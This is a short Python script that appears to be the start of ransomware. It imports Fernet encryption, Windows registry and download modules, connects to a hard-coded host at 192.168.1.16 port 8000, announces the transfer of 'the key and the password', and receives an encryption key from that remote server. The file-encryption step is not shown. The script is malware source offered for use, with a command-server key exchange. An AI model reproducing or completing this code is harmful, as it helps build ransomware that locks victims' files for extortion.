#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os, sys, socket, wget, struct, ctypes, shutil, time, winreg

#START THE SOCKET SERVER
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.1.16", 8000))
enter = "[!] Transfert the key and the password :\n "
exit = "\n[!] Transfert [OK]"
sock.send(enter.encode())

print(sock.recv(2048).decode())
key = sock.recv(2048)
print(key)

sock.send(exit.encode())
sock.close()
